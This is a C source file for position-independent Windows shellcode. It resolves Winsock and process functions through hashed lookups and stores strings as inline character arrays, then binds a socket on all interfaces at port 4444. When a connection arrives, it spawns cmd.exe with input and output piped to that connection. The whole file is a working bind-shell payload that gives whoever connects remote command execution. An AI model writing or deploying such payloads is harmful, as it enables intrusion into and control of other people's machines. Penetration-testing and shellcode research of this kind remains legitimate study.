#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include <windows.h>
#include <winsock2.h>
#include <intrin.h>

#define BIND_PORT 4444
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )

// Redefine Win32 function signatures. This is necessary because the output
// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
// working with these functions a joy in Visual Studio with Intellisense.
typedef HMODULE (WINAPI *FuncLoadLibraryA) (
	_In_z_	LPTSTR lpFileName
);

typedef int (WINAPI *FuncWsaStartup) (
	_In_	WORD wVersionRequested,
	_Out_	LPWSADATA lpWSAData
);

typedef SOCKET (WINAPI *FuncWsaSocketA) (
	_In_		int af,
	_In_		int type,
	_In_		int protocol,
	_In_opt_	LPWSAPROTOCOL_INFO lpProtocolInfo,
	_In_		GROUP g,
	_In_		DWORD dwFlags
);

typedef int (WINAPI *FuncBind) (
	_In_	SOCKET s,
	_In_	const struct sockaddr *name,
	_In_	int namelen
);

typedef int (WINAPI *FuncListen) (
	_In_	SOCKET s,
	_In_	int backlog
);

typedef SOCKET (WINAPI *FuncAccept) (
	_In_		SOCKET s,
	_Out_opt_	struct sockaddr *addr,
	_Inout_opt_	int *addrlen
);

typedef int (WINAPI *FuncCloseSocket) (
	_In_	SOCKET s
);

typedef BOOL (WINAPI *FuncCreateProcess) (
	_In_opt_	LPCTSTR lpApplicationName,
	_Inout_opt_	LPTSTR lpCommandLine,
	_In_opt_	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_		BOOL bInheritHandles,
	_In_		DWORD dwCreationFlags,
	_In_opt_	LPVOID lpEnvironment,
	_In_opt_	LPCTSTR lpCurrentDirectory,
	_In_		LPSTARTUPINFO lpStartupInfo,
	_Out_		LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI *FuncWaitForSingleObject) (
	_In_	HANDLE hHandle,
	_In_	DWORD dwMilliseconds
);

// Write the logic for the primary payload here
// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
VOID ExecutePayload( VOID )
{
	FuncLoadLibraryA MyLoadLibraryA;
	FuncWsaStartup MyWSAStartup;
	FuncWsaSocketA MyWSASocketA;
	FuncBind MyBind;
	FuncListen MyListen;
	FuncAccept MyAccept;
	FuncCloseSocket MyCloseSocket;
	FuncCreateProcess MyCreateProcessA;
	FuncWaitForSingleObject MyWaitForSingleObject;
	WSADATA WSAData;
	SOCKET s;
	SOCKET AcceptedSocket;
	struct sockaddr_in service;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	// Strings must be treated as a char array in order to prevent them from being stored in
	// an .rdata section. In order to maintain position independence, all data must be stored
	// in the same section. Thanks to Nick Harbour for coming up with this technique:
	// http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
	char cmdline[] = { 'c', 'm', 'd', 0 };
	char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };

	// Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	#pragma warning( push )
	#pragma warning( disable : 4055 ) // Ignore cast warnings
	// Should I be validating that these return a valid address? Yes... Meh.
	MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );

	// You must call LoadLibrary on the winsock module before attempting to resolve its exports.
	MyLoadLibraryA((LPTSTR) module);

	MyWSAStartup =			(FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
	MyWSASocketA =			(FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
	MyBind =				(FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
	MyListen =				(FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
	MyAccept =				(FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
	MyCloseSocket =			(FuncCloseSocket) GetProcAddressWithHash( 0x614D6E75 );
	MyCreateProcessA =		(FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
	MyWaitForSingleObject =	(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
	#pragma warning( pop )

	MyWSAStartup( MAKEWORD( 2, 2 ), &WSAData );
	s = MyWSASocketA( AF_INET, SOCK_STREAM, 0, NULL, 0, 0 );

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
	service.sin_port = HTONS( BIND_PORT );

	MyBind( s, (SOCKADDR *) &service, sizeof(service) );
	MyListen( s, 0 );
	AcceptedSocket = MyAccept( s, NULL, NULL );
	MyCloseSocket( s );

	StartupInfo.hStdError = (HANDLE) AcceptedSocket;
	StartupInfo.hStdOutput = (HANDLE) AcceptedSocket;
	StartupInfo.hStdInput = (HANDLE) AcceptedSocket;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = 68;

	MyCreateProcessA( 0, (LPTSTR) cmdline, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation );
	MyWaitForSingleObject( ProcessInformation.hProcess, INFINITE );
}